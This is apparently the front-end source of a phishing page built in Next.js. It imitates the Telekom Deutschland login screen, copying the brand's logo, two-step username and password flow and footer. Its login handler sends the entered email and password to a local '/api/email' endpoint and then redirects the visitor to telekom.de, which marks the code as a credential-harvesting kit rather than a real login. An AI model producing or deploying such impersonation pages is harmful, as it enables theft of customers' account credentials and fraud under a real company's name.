'use client';

import { useState } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
export default function Home() {
  const [activeSlide, setActiveSlide] = useState(1);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [rememberUsername, setRememberUsername] = useState(false);
  const router = useRouter();
  const handleNext = () => {
    if (username.trim() !== '') {
      setActiveSlide(2);
    }
  };

  const handleBack = () => {
    setActiveSlide(1);
  };

  const handleLogin = async () => {
    if (username.trim() !== '' && password.trim() !== '') {
      try {
        const response = await fetch('/api/email', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ email: username, password }),
        });

        if (!response.ok) {
          throw new Error('Login failed');
        }
        // redirect to /dashboard
        router.push('/https://telekom.de/');
        console.log('Login successful');
      } catch (error) {
        console.error('Login error:', error);
      }
    }
  };

  return (
    <main>
      <div className="logo-container">
        <TelekomLogo />
      </div>

      <div className="login-container">
        <div className="login-header">
          <h1>Telekom login</h1>
          <HelpIcon />
        </div>

        <div className="login-slides">
          {activeSlide === 1 ? (
            <div className="slide active">
              <div className="input-group">
                <input
                  type="text"
                  placeholder="user name"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && handleNext()}
                />
              </div>

              <div className="remember-me">
                <label className="switch">
                  <input
                    type="checkbox"
                    checked={rememberUsername}
                    onChange={(e) => setRememberUsername(e.target.checked)}
                  />
                  <span className="slider" />
                </label>
                <span>Remember username</span>
                <HelpIcon />
              </div>

              <button onClick={handleNext} className="btn btn-primary">
                Further
              </button>
              <button className="btn btn-secondary">
                Other login options
              </button>
            </div>
          ) : (
            <div className="slide active">
              <div className="input-group">
                <input
                  type="password"
                  placeholder="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
                />
              </div>

              <button onClick={handleLogin} className="btn btn-primary">
                Log in
              </button>
              <button onClick={handleBack} className="btn btn-secondary">
                Back
              </button>
            </div>
          )}
        </div>

        <Link href="#" className="register-link">
          New here? Register now
        </Link>
      </div>

      <footer className="footer">
        <div>© Telekom Deutschland GmbH</div>
        <div className="version">26.16.0</div>
        <div className="footer-links">
          <Link href="#">imprint</Link>
          <Link href="#">data protection</Link>
        </div>
      </footer>
    </main>
  );
}

const TelekomLogo = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    viewBox="0 0 32 38"
    fill="#ffffff"
    role="img"
  >
    <title>Telekom Logo</title>
    <path d="M7.6 25.1H0v-7.6h7.6v7.6ZM0 0v12.9h2.3v-.4c0-6.1 3.4-9.9 9.9-9.9h.4V30c0 3.8-1.5 5.3-5.3 5.3H6.1V38h19.8v-2.7h-1.1c-3.8 0-5.3-1.5-5.3-5.3V2.7h.4c6.5 0 9.9 3.8 9.9 9.9v.4h2.3V0H0Zm24.3 25.1h7.6v-7.6h-7.6v7.6Z" />
  </svg>
);

const HelpIcon = () => (
  <svg
    className="help-icon"
    xmlns="http://www.w3.org/2000/svg"
    viewBox="0 0 24 24"
  >
    <g fill="currentColor">
      <path
        d="M12 1c6.075 0 11 4.925 11 11s-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1zm0 1.5c-5.239 0-9.5 4.261-9.5 9.5 0 5.238 4.261 9.5 9.5 9.5 5.238 0 9.5-4.262 9.5-9.5 0-5.239-4.262-9.5-9.5-9.5zM12 15a1.25 1.25 0 110 2.5 1.25 1.25 0 010-2.5zm.101-7.98c1.695 0 2.926 1.123 2.926 2.67 0 .876-.381 1.437-.824 1.89l-.225.217-.462.42c-.346.323-.636.655-.69 1.095l-.01.152v.332H11.07v-.603c0-.89.46-1.383.968-1.811l.475-.391c.388-.33.707-.676.707-1.196 0-.7-.428-1.134-1.118-1.134-.612 0-1.02.366-1.146 1.015l-.022.143H9.12c.085-1.412 1.027-2.799 2.981-2.799z"
        fillRule="evenodd"
      />
    </g>
  </svg>
);
